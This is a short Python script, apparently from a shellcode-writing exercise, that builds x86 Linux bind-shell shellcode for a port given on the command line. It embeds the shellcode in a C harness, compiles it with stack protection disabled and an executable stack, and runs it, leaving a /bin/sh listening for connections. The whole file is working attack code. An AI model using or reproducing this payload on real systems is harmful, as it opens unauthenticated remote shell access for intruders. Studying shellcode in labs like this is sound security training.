from sys import argv
import os
from socket import htons
if len(argv) < 2:
    print ("PLEASE INPUT PORT NUMBER")
elif len(argv) > 2:
    print ("PLEASE INPUT ONLY PORT NUMBER")
else:
    port = int (argv[1])
    port_old=port
    port = hex(htons(port))
    shellcode=r"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x31\xc0\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x52\x52\x66\x68\x"+port[4:6]+r"\x"+port[2:4]+r"\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xd2\x31\xc9\xcd\x80\x89\xc3\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\xfe\xc1\xe2\xf4\x31\xc0\xb0\x0b\x31\xd2\x52\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

    file_text="""
#include<stdio.h>
#include<string.h>

unsigned char code[] =\"""" + shellcode + """";

int main()
{

	printf("Shellcode Length:  %d\\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
"""
    print ("[+] Write data to file")
    file=open("code.c","w")
    file.write(file_text)
    file.close()
    print ("[+] Compile file using GCC")
    os.system("gcc -fno-stack-protector -z execstack -m32 code.c -o code -B /usr/lib32/")
    print ("[+] Bind shell here, connect to "+ str(port_old))
    os.system ("./code")
